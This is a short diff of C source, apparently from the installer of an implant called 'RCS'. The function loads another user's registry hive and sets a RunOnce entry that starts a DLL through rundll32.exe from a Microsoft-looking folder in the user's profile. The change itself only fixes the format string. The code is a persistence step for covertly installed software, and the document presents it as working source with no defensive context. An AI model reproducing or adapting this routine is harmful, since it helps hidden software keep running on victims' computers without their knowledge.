@@ -48,7 +48,7 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\", tmp_path) != ERROR_SUCCESS) 
 		return FALSE;
 
-	swprintf_s(tmp_path, sizeof(tmp_path)/sizeof(tmp_path[0]), L"%%SystemRoot%%\\system32\\rundll32.exe \"%%USERPROFILE%%%s\\Microsoft\\%s\\%s\",%s8", user_info->user_local_settings, rcs_info->new_hdir, rcs_info->hcore, rcs_info->func_name);
+	swprintf_s(tmp_path, sizeof(tmp_path)/sizeof(tmp_path[0]), L"%%SystemRoot%%\\system32\\rundll32.exe \"%%USERPROFILE%%%s\\Microsoft\\%s\\%s\",%s", user_info->user_local_settings, rcs_info->new_hdir, rcs_info->hcore, rcs_info->func_name);
 	if (RegSetKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", rcs_info->hreg, REG_EXPAND_SZ, tmp_path, (wcslen(tmp_path)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
 		RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
 		return FALSE;
